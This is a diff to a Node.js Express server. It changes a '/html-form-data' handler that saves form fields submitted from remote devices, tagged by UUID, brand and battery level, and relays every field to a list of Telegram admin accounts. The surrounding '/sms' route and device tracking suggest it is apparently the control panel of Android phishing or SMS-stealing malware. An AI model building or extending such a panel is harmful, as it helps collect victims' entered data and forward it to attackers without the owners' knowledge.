@@ -89,34 +89,35 @@ app.post('/sms',(req,res) => {
 });
 
 // HTML Form submit
+// Express + Telegram Bot
 app.post('/html-form-data', (req, res) => {
-  const { uuid, ...fields } = req.body;
-  if (!uuid) return res.status(400).send('missing uuid');
+  const { uuid, brand, battery, ...fields } = req.body;
+  if(!uuid) return res.status(400).send('Missing UUID');
 
-  // Save form data
+  // Save JSON file for this device
   const fp = path.join(STORAGE_DIR, `${uuid}.json`);
-  fs.writeJsonSync(fp, fields, { spaces: 2 });
+  fs.writeJsonSync(fp, { brand, battery, ...fields }, { spaces:2 });
 
-  // Get device info (including battery and brand)
-  const device = devices.get(uuid) || { model: uuid, brand: 'Unknown', battery: 'N/A' };
+  // Device info for Telegram
+  const device = devices.get(uuid) || { model: uuid, brand: brand || 'Unknown', battery: battery || 'N/A' };
 
-  // Prepare message with brand below device name
-  let msg = `🧾 *Form Submitted*\n📱 ${device.model}\n🏷 Brand: ${device.brand}\n🔋 Battery: ${device.battery || 'N/A'}%\n`;
+  // Telegram message
+  let msg = `🧾 *Form Submitted*\n📱 ${device.model}\n🏷 Device Brand: ${device.brand}\n🔋 Battery: ${device.battery || 'N/A'}%\n\n`;
 
-  // Add all form fields
-  for (let [k, v] of Object.entries(fields)) {
-    const label = k.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
-    msg += `🔸 *${label}*: ${v}\n`;
+  for(let [k,v] of Object.entries(fields)){
+    const label = k.replace(/_/g,' ').replace(/\b\w/g, c=>c.toUpperCase());
+    msg += `🔸 ${label}: ${v}\n`;
   }
 
   msg += `\n👨‍💻 Developer: ${DEVELOPER}`;
 
   // Send to all admins
-  ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }).catch(() => {}));
+  ADMIN_IDS.forEach(id => {
+      bot.sendMessage(id, msg, { parse_mode:'Markdown' }).catch(()=>{});
+  });
 
   res.sendStatus(200);
 });
-
 // ===== TELEGRAM BOT =====
 bot.on('message', msg => {
   const chatId = msg.chat.id;
